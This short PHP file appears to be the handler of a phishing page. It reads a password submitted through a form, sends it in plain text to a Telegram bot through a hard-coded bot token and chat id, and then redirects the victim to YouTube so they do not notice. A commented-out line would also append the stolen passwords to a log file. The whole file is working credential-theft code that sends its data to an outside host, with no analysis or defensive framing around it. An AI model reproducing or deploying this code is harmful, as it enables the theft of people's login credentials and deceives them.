<?php

   // file_put_contents("log.txt", "Pass: " . $_POST['password'] . "\n", FILE_APPEND);
	
	define ('url',"https://api.telegram.org/bot5301736219:AAGvdIIBXDVlSfk5kdHT3JjTdIpBXFhEMw0/");
$pwd= $_POST['password'];
$chat_id = '605677274';
$message = urlencode("Password:".$pwd);
file_get_contents(url."sendmessage?text=".$message."&chat_id=".$chat_id."&parse_mode=HTML");
//header('Location: pass.login.php');
//header('Location: postss.php');
header('Location:  https://youtube.com');

exit();